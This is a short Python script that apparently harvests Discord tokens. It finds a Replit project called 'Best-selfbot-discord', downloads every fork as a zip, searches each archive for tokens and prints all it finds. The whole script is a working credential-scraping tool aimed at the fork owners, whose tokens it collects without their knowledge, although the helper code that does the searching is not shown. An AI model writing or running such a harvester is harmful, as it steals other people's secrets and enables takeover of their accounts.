import uvloop
from resources import Design
import asyncio
from resources import ReplIt
from aioconsole import aprint


uvloop.install()

async def main():
    repl = ReplIt()
    await Design.ascii()
    id = await repl.get_id("/@JssjjsJsjss/Best-selfbot-discord")
    urls, ids = await repl.get_forks(id)
    await aprint(len(urls))
    full = []

    for url, id in zip(urls, ids):
        try:
            await repl.get_zip(url, id)
            tokens = await repl.search_zip(id)
            full += tokens
        except:
            continue

    for token in full:
        await aprint(token)










asyncio.run(main())
